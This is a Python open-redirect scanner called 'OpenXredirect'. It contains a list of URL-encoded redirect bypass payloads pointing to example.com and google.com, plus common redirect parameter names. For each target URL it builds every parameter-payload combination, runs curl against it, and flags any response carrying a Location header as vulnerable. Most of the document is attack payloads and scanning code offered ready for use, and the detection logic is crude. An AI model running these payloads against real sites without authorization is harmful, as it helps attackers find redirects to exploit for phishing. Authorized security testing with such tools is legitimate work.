import requests
import subprocess
from urllib.parse import urlparse, urlencode, urlunparse
from colorama import Fore, Style, init
from pwn import *
import os
from IPython.display import clear_output


def def_handler(sig, frame):
    print("[!]Leaving......")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

1
init(autoreset=True)

banner = r"""

       ▄▄▄·▄▄▄ . ▐ ▄ ▐▄• ▄ ▄▄▄  ▄▄▄ .·▄▄▄▄  ▪  ▄▄▄  ▄▄▄ . ▄▄· ▄▄▄▄▄
▪     ▐█ ▄█▀▄.▀·•█▌▐█ █▌█▌▪▀▄ █·▀▄.▀·██▪ ██ ██ ▀▄ █·▀▄.▀·▐█ ▌▪•██  
 ▄█▀▄  ██▀·▐▀▀▪▄▐█▐▐▌ ·██· ▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌▐█·▐▀▀▄ ▐▀▀▪▄██ ▄▄ ▐█.▪
▐█▌.▐▌▐█▪·•▐█▄▄▌██▐█▌▪▐█·█▌▐█•█▌▐█▄▄▌██. ██ ▐█▌▐█•█▌▐█▄▄▌▐███▌ ▐█▌·
 ▀█▄▀▪.▀    ▀▀▀ ▀▀ █▪•▀▀ ▀▀.▀  ▀ ▀▀▀ ▀▀▀▀▀• ▀▀▀.▀  ▀ ▀▀▀ ·▀▀▀  ▀▀▀  v1.0.0
                             by:skyrowalker
"""
print(banner)

def clear_screen():
    clear_output(wait=True)


payloads = [
    "%2F%2Fexample.com%40google.com%2F%252f..", "%2F%2Fgoogle.com%2F%252f..", "%2F%2Fexample.com%40google.com%2F%252e%2e",
    "%2F%2Fgoogle.com%2F%252e%2e", "%2F%2Fhttps%3A%2F%2Fgoogle.com%2F%252f..", "%2F%2Fhttps%3A%2F%2Fexample.com%40google.com%2F%252f..",
    "%2Fhttps%3A%2F%2Fgoogle.com%2F%252f..", "%2Fhttps%3A%2F%2Fexample.com%40google.com%2F%252f..", "%2F%2Fgoogle.com%2F%252f%2e%2e",
    "%2F%2Fexample.com%40google.com%2F%252f%2e%2e", "%2F%2Fgoogle.com%2F%252e%2e", "%2F%2Fexample.com%40google.com%2F%252e%2e",
    "%2F%2Fgoogle.com%2F%252f%2e%2e", "%2F%2Fhttps%3A%2F%2Fgoogle.com%2F%252f..", "%2F%2Fhttps%3A%2F%2Fexample.com%2F",
    "/%2Fhttps%3A%2F%2Fexample.com%2F%252f%252e%2e", "//%09/example.com", "//%5cexample.com", "///%09/example.com",
    "///%5cexample.com", "////%09/example.com", "////%5cexample.com", "/////example.com", "/////example.com/",
    "////\\;@example.com", "////example.com/", "/http://example.com/%2f%2e%2e/", "/https://example.com/%2f..%2f",
    "/https://example.com/%2e%2e%2f", "/https://example.com/%2e%2f%2e", "/http://%5cexample.com/", "/https%3A%2F%2Fexample.com/",
    "/https:///example.com/%2e%2e/", "/https:///example.com/%2f%2e%2e/", "/https://%5cexample.com/%2f%2e%2e/",
    "/https://example.com%2f%2e%2e/", "/http://example.com//", "/https:/%5cexample.com/", "/https:///example.com//",
    "/https://example.com///", "/https:example.com/%2f%2e%2e/", "/https://example.com/%2f%2e%2e%2f/",
    "/https://%09/example.com/%2f%2e%2e/", "/https://%5cexample.com/%2f..%2f/", "/https://example.com/%2e%2f%2e%2f/"
]
redirect_params = [
    "redir.php?r=", "url=", "?target=", "?rurl=", "?dest=", "?destination=", "?redir=", "redirect_uri=", 
    "?redirect_url=", "?redirect=", "?next=", "login?return=", "?return="
]


    
def check_open_redirect(url):
    
    p1 = log.progress("OpenXredirect")
    p1.status("Starting...")

    time.sleep(2)
    
    parsed_url = urlparse(url)
    
    for param in redirect_params:
        for payload in payloads:
           
            query = f"{param}{payload}"
            new_url = parsed_url._replace(path=parsed_url.path + query)  
            
           
            try:
                #
                cmd = ["curl", "-I", urlunparse(new_url)]
                p1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = p1.communicate()
                
                
                if p1.returncode == 0:
                    if "Location" in stdout.decode():
                        print(f"{Fore.GREEN}[✔] {urlunparse(new_url)} vulnerable to Open Redirect")
                    else:
                        print(f"{Fore.RED}[✖] {urlunparse(new_url)} not vulnerable")
                else:
                    print(f"{Fore.RED}Error executing command for {urlunparse(new_url)}: {stderr.decode()}")
            except Exception as e:
                print(f"{Fore.RED}Error trying {urlunparse(new_url)}: {e}")


def get_urls():
    choice = input("Do you want to enter a single link (1) or upload a list from a .txt file (2)?: ").strip()

    if choice == "1":
        url = input("[!]Enter the URL: ").strip()
        check_open_redirect(url)
    elif choice == "2":
        filename = input("Enter the path of the .txt file that contains the URLs: ").strip()
        try:
            with open(filename, "r") as file:
                urls = file.readlines()
                for url in urls:
                    check_open_redirect(url.strip())
        except FileNotFoundError:
            print(f"{Fore.RED}[404]The file was not found.")
    else:
        print(f"{Fore.RED}Invalid option. The program will close.")
        return
    
get_urls()
